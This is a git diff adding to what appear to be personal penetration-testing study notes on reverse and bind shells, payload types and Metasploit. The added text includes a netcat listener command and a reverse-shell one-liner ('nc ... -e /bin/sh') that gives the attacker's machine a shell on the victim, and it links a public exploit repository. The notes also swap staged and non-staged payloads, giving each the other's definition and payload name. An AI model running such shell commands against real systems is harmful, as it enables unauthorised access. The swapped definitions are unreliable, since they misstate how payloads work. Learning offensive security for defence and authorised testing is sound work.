@@ -163,5 +163,22 @@ Response codes: 200 ok, 400 error, 500 server error, 300 is redirect
 - Alternatively a bin shell means that we connect to a target - usually used when reverse shell is not working
 - poping a shell means gaining access to a machine
 
-`nc -lvp 444` attack box (lvp means listening verbose port)
-`nc 192.168.1.1 4444 -e /bin/sh
+**Reverse Shell**
+-`nc -nvlp 444` attack box (lvp means listening verbose port)
+-`nc 192.168.1.1 4444 -e /bin/sh` This is telling the victim machine to connect to the ip address of my attack machine 
+
+**Bin shell**
+- You send an exploit to the victim's machine and then open a port there. Next you connect to it via your attacking VM once the port is established. All of this is done using Netcat
+
+**Payload** it is the exploit- there are various different options. You send it to a victim and then attempt to open a shell in the victim. It is either staged or unstaged
+- Windows type
+- Linux type
+- Meterpreter
+- python
+
+- It is important to know the staged vs non-staged. If one does not work, try the other
+- **Staged**- sends all shellcode at once- might not always work `windows/meterpreter_reverse_tcp`
+- **Non-staged**- sends the code in stages, is less stable `windows/meterpreter/reverse_tcp
+
+- we can use metasploit or also send exploits manually. One option is openfuck https://github.com/heltonWernik/OpenLuck
+
